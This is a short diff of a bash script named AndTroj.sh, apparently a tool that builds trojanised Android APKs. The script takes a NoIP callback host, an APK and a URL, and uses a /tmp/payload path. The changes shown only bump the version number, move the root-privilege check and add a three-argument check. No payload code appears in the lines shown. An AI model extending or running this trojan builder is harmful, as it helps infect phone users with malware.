@@ -12,18 +12,9 @@ WHITE="\u001b[37m"
 YELLOW="\u001b[33m"
 
 
-version="70"
+version="72"
 apktool_version="2.6.1-dirty"
 TORRC=$(cat /etc/tor/torrc|grep -o "UseBridges 1")
-
-
-if [ "$(id -u)" != "0" ];then
-	echo -e "$RED [X]$YELLOW Please run as RooT ... $YELLOW"
-	echo -e "$GREEN [*]$YELLOW sudo chmod +x AndTroj.sh;sudo ./AndTroj.sh $YELLOW"
-	exit 0
-fi
-
-
 NoIP=$1
 APK=$2
 URL=$3
@@ -32,6 +23,16 @@ PAYLOAD="/tmp/payload"
 OUTPUT=`echo $APK | cut -d "." -f 1`
 SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)
 LAN=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | grep -v '169.*.*.*' | grep -v '192.168.56.*' | grep -v '192.168.236.*')
+
+
+if [ "$(id -u)" != "0" ];then
+	echo -e "$RED [X]$YELLOW Please run as RooT ... $YELLOW"
+	echo -e "$GREEN [*]$YELLOW sudo chmod +x AndTroj.sh;sudo ./AndTroj.sh $YELLOW"
+	exit 0
+elif [ "$#" != "3" ]; then
+    echo -e "$RED [X]$YELLOW You Must Provide Three Args ... $YELLOW"
+    echo -e "$GREEN [*]$YELLOW sudo ./AndTroj.sh \$NoIP \$APK \$URL $YELLOW"
+fi
 
 
 
